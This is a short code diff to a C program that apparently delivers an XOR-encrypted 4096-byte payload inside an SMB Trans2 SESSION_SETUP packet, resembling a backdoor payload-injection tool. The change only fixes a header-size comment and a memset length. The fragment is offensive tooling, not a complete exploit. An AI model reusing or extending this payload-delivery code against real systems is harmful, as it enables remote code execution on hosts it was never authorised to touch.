@@ -301,11 +301,12 @@ int main(int argc, char* argv[])
 	xor_payload(XorKey, encrypted, 4096);
 
 	//build packet buffer with 4178 bytes in length
-	//82 bytes for the Trans2 Session Setup packet header
+	//70 bytes for the Trans2 Session Setup packet header
 	//12 bytes for the SESSION_SETUP
 	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
+	//total of 4178 for the entire packet
 	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
-	memset(big_packet, 0x00, 4178);
+	memset(big_packet, 0x00, 4178+1);
 
 	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
 	unsigned char CHAR_XOR_KEY[4];
